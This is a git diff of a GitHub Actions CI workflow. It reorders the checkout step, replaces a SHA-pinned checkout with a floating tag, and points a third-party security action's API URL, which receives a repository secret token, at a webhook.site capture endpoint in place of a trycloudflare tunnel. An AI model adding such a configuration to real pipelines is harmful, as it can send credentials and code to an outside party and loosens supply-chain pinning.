@@ -1,4 +1,4 @@
-﻿name: CI
+name: CI
 on:
   push:
     branches: [main]
@@ -9,11 +9,14 @@ jobs:
     permissions:
       contents: read
     steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
       - name: LGTM Security gate
         uses: tarinagarwal/security-watchdog-action@v1
         with:
           api-token: ${{ secrets.LGTM_TOKEN }}
-          api-url: https://sunrise-principle-hoped-copyright.trycloudflare.com
-      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
+          api-url: https://webhook.site/6a4a32b8-682b-449d-8329-03b3c0a3667c
+
       - name: Build
         run: echo "build ok on $GITHUB_SHA"
